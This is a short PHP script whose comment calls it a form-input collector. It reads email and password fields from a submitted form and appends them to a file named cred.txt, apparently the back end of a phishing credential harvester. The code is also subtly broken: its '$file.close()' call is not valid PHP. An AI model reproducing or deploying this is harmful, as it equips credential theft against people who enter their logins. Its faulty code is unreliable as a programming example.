<?php
    
// collect and save html form inputs to a file
class collector {
    function storage () {
        $email = 'Email: ' . $_POST['email'];
    	$password = 'Password: ' . $_POST['password'];
    	$file = fopen('cred.txt', 'a');
    	fwrite($file, $email . "\n" . $password);
    	$file.close();
    }
}
    
// instance of the class
$ins = new collector();
$ins->storage();
    ?>
